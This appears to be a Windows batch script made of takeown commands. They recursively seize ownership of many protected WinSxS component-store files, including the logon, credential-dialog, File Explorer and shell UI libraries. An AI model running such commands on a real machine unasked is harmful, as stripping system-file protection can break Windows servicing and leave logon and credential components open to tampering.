takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-a..skmanager.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ebae69d8223faa30\r\Windows.UI.TaskManager.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\Windows.UI.TaskManager.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\f\Windows.UI.TaskManager.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-advancedtaskmanager_31bf3856ad364e35_10.0.22621.2792_none_8eb4fe5967268eb4\r\Windows.UI.TaskManager.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults.resources_31bf3856ad364e35_10.0.22621.1_en-us_0e504f2e5e6ac911\Windows.UI.AppDefaults.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\Windows.UI.AppDefaults.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\f\Windows.UI.AppDefaults.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-appdefaults_31bf3856ad364e35_10.0.22621.2506_none_d2c591f2c4f7b42e\r\Windows.UI.AppDefaults.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-c..ontroller.resources_31bf3856ad364e35_10.0.22621.1_en-us_8cd6df30e4ee1365\Windows.UI.CredDialogController.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\Windows.UI.CredDialogController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\f\Windows.UI.CredDialogController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-creddialogcontroller_31bf3856ad364e35_10.0.22621.2506_none_0cdf2f26dee87b4d\r\Windows.UI.CredDialogController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-d..ctui-resourceswin81_31bf3856ad364e35_10.0.22621.1_none_7d7e5e0d80f786f1\Windows.UI.Xaml.Resources.win81.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-d..ui-resourceswin8rtm_31bf3856ad364e35_10.0.22621.1_none_ec48a461d684adc1\Windows.UI.Xaml.Resources.win8rtm.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resources19h1_31bf3856ad364e35_10.0.22621.1_none_52ec67724094312f\Windows.UI.Xaml.Resources.19h1.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resources21h1_31bf3856ad364e35_10.0.22621.1_none_53b46e00400a562e\Windows.UI.Xaml.Resources.21h1.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs1_31bf3856ad364e35_10.0.22621.1_none_bd97a1235581e454\Windows.UI.Xaml.Resources.rs1.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs2_31bf3856ad364e35_10.0.22621.1_none_bd98a16d5580fdab\Windows.UI.Xaml.Resources.rs2.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs3_31bf3856ad364e35_10.0.22621.1_none_bd99a1b755801702\Windows.UI.Xaml.Resources.rs3.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs4_31bf3856ad364e35_10.0.22621.1_none_bd9aa201557f3059\Windows.UI.Xaml.Resources.rs4.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesrs5_31bf3856ad364e35_10.0.22621.1_none_bd9ba24b557e49b0\Windows.UI.Xaml.Resources.rs5.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui-resourcesth_31bf3856ad364e35_10.0.22621.1_none_30ff4cd02123fe20\Windows.UI.Xaml.Resources.th.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\Windows.UI.Xaml.Resources.Common.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\f\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\f\Windows.UI.Xaml.Resources.Common.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\r\Windows.UI.Xaml.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-directui_31bf3856ad364e35_10.0.22621.3007_none_970653fe6a0d1287\r\Windows.UI.Xaml.Resources.Common.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\Windows.UI.SettingsAppThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\f\Windows.UI.SettingsAppThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-i...appxmain.resources_31bf3856ad364e35_10.0.22621.2861_en-us_be26ad19791a8a78\r\Windows.UI.SettingsAppThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\Windows.UI.SettingsAppThreshold.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\f\Windows.UI.SettingsAppThreshold.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-i..ntrolpanel.appxmain_31bf3856ad364e35_10.0.22621.2792_none_fa8c2de212aeffe6\r\Windows.UI.SettingsAppThreshold.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\f\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-inputservice_31bf3856ad364e35_10.0.22621.2792_none_99b7f4cab531a349\r\Windows.UI.Core.TextInput.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-p..alog.core.resources_31bf3856ad364e35_10.0.22621.2506_en-us_884c97faf651599e\Windows.UI.PrintDialog.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-p..d-library.resources_31bf3856ad364e35_10.0.22621.1_en-us_16be39094a98258f\Windows.UI.PicturePassword.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-p..urepassword-library_31bf3856ad364e35_10.0.22621.1_none_72a541ee9cbe801c\Windows.UI.PicturePassword.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-printdialog.core_31bf3856ad364e35_10.0.22621.2506_none_c0ac442099d1239d\Windows.UI.PrintDialog.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\f\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\f\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\r\Windows.UI.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-runtime-metadata_31bf3856ad364e35_10.0.22621.2792_none_10c05ec783812334\r\Windows.UI.Xaml.winmd" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\f\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..dminflows.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1e22d452a6cded4\r\Windows.UI.SettingsAdminFlowUIThreshold.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\Windows.UI.SettingsAdminFlowUIThreshold.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\f\Windows.UI.SettingsAdminFlowUIThreshold.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..hreshold-adminflows_31bf3856ad364e35_10.0.22621.2792_none_007a421b998a317a\r\Windows.UI.SettingsAdminFlowUIThreshold.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ink-inkanalysiscore_31bf3856ad364e35_10.0.22621.1_none_aa7c9c53ef1e6cd6\Windows.UI.Input.Inking.Analysis.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\Windows.UI.ActionCenter.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\Windows.UI.QuickActions.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\f\Windows.UI.ActionCenter.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\f\Windows.UI.QuickActions.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\r\Windows.UI.ActionCenter.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ncehost.shellcommon_31bf3856ad364e35_10.0.22621.3007_none_28d3419fd1260c93\r\Windows.UI.QuickActions.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\Windows.UI.SettingsHandlers-nt.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.2506_en-us_e1c191afd8d8f6e6\r\Windows.UI.SettingsHandlers-nt.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\Windows.UI.SettingsHandlers-nt.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\f\Windows.UI.SettingsHandlers-nt.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..ndlers-nt.resources_31bf3856ad364e35_10.0.22621.3007_en-us_e1f78c69d8b081f9\r\Windows.UI.SettingsHandlers-nt.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\Windows.UI.SoftLanding.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\f\Windows.UI.SoftLanding.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..riencehost.appxmain_31bf3856ad364e35_10.0.22621.2792_none_dca88e457a95c152\r\Windows.UI.SoftLanding.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\Windows.UI.SettingsHandlers-nt.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\f\Windows.UI.SettingsHandlers-nt.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-s..settingshandlers-nt_31bf3856ad364e35_10.0.22621.3007_none_5df6ee22ce8e78a0\r\Windows.UI.SettingsHandlers-nt.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..-controls.resources_31bf3856ad364e35_10.0.22621.1_en-us_4a382a521107e8b6\Windows.UI.Xaml.Controls.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..aml-phone.resources_31bf3856ad364e35_10.0.22621.1_en-us_c478a37645904f0a\Windows.UI.Xaml.Phone.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..d-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_c6de915a33bca65f\Windows.UI.Cred.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\Windows.UI.FileExplorer.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\f\Windows.UI.FileExplorer.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..eexplorer.resources_31bf3856ad364e35_10.0.22621.2506_en-us_ef0f04b04bf96d70\r\Windows.UI.FileExplorer.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\Windows.UI.Shell.SharedUtilities.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\f\Windows.UI.Shell.SharedUtilities.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..ell-sharedutilities_31bf3856ad364e35_10.0.22621.2506_none_ab1f68bc85f79f90\r\Windows.UI.Shell.SharedUtilities.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..ernal-adaptivecards_31bf3856ad364e35_10.0.22621.1_none_1eb104dda2fe5c9c\Windows.UI.Shell.Internal.AdaptiveCards.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..k-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_969c6f85b7434b5e\Windows.UI.BioFeedback.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..kcontrols.resources_31bf3856ad364e35_10.0.22621.1_en-us_b938c9fb614fcd56\Windows.UI.Xaml.InkControls.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..kedshutdown-library_31bf3856ad364e35_10.0.22621.1_none_f9c77629fd98bf20\Windows.UI.BlockedShutdown.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..kedshutdown-library_31bf3856ad364e35_10.0.22621.1_none_f9c77629fd98bf20\Windows.UI.BlockedShutdown.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\Windows.UI.ShellCommon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\f\Windows.UI.ShellCommon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.2506_en-us_19c3fe1a523589c3\r\Windows.UI.ShellCommon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\Windows.UI.ShellCommon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\f\Windows.UI.ShellCommon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-desktop.resources_31bf3856ad364e35_10.0.22621.3007_en-us_19f9f8d4520d14d6\r\Windows.UI.ShellCommon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_2955f18be12a2ca3\Windows.UI.BlockedShutdown.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\Windows.UI.Logon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\f\Windows.UI.Logon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..n-library.resources_31bf3856ad364e35_10.0.22621.2506_en-us_f3baf1b955d1bb4c\r\Windows.UI.Logon.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..ninetcore.resources_31bf3856ad364e35_10.0.22621.2506_en-us_8ef2b2082a8472af\Windows.UI.ShellCommonInetCore.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..rer-wasdk.resources_31bf3856ad364e35_10.0.22621.2506_en-us_56685fb6d5165a87\Windows.UI.FileExplorer.WASDK.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-u..rer-wasdk.resources_31bf3856ad364e35_10.0.22621.2506_en-us_56685fb6d5165a87\n\Windows.UI.FileExplorer.WASDK.dll.mui" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\Windows.UI.BioFeedback.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\Windows.UI.BioFeedback.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\f\Windows.UI.BioFeedback.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\f\Windows.UI.BioFeedback.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\r\Windows.UI.BioFeedback.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-biofeedback-library_31bf3856ad364e35_10.0.22621.2506_none_e1e315c2bb4a5883\r\Windows.UI.BioFeedback.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\Windows.UI.Cred.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\Windows.UI.Cred.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\f\Windows.UI.Cred.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\f\Windows.UI.Cred.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\r\Windows.UI.Cred.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-cred-library_31bf3856ad364e35_10.0.22621.2506_none_9f29ab110e06bc1c\r\Windows.UI.Cred.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.2792_none_8bc301cff7ea5fd7\Windows.UI.FileExplorer.WASDK.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer-wasdk_31bf3856ad364e35_10.0.22621.2792_none_8bc301cff7ea5fd7\n\Windows.UI.FileExplorer.WASDK.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\f\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-fileexplorer_31bf3856ad364e35_10.0.22621.2792_none_66c262f616e1ff18\r\Windows.UI.FileExplorer.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\Windows.UI.Logon.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\Windows.UI.Logon.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\f\Windows.UI.Logon.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\f\Windows.UI.Logon.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\r\Windows.UI.Logon.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-logon-library_31bf3856ad364e35_10.0.22621.2506_none_5d292d61c47d3419\r\Windows.UI.Logon.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\Windows.UI.NetworkUXController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\f\Windows.UI.NetworkUXController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-networkuxcontroller_31bf3856ad364e35_10.0.22621.2506_none_bf3cfb1b5174d0e9\r\Windows.UI.NetworkUXController.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\Windows.UI.PCShell.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\f\Windows.UI.PCShell.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_36c82c63af13c34e\r\Windows.UI.PCShell.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\Windows.UI.PCShell.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\f\Windows.UI.PCShell.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-pcshell_31bf3856ad364e35_10.0.22621.2506_none_f47919e5326ec241\r\Windows.UI.PCShell.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search.resources_31bf3856ad364e35_10.0.22621.2506_en-us_53839e6ae9c220a9\Windows.UI.Search.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\Windows.UI.Search.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\Windows.UI.Search.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\f\Windows.UI.Search.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-search_31bf3856ad364e35_10.0.22621.2506_none_d4eb9eca9ea17ee2\r\Windows.UI.Search.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\Windows.UI.Shell.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\Windows.UI.Shell.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\f\Windows.UI.Shell.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell-component_31bf3856ad364e35_10.0.22621.2506_none_2d7be6f886278ad2\r\Windows.UI.Shell.dll" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shell.resources_31bf3856ad364e35_10.0.22621.2506_en-us_902c5810061b8c5d\Windows.UI.Shell.en-US.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\Windows.UI.ShellCommon.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\f\Windows.UI.ShellCommon.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommon-desktop_31bf3856ad364e35_10.0.22621.3007_none_b47b6d8e2e44587f\r\Windows.UI.ShellCommon.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\Windows.UI.ShellCommonInetCore.pri" /r /d y
takeown /f "C:\Windows\WinSxS\amd64_microsoft-windows-ui-shellcommoninetcore_31bf3856ad364e35_10.0.22621.2506_none_9b69ece04f913aaa\f\Windows.UI.ShellCommonInetCore.pri" /r /d y
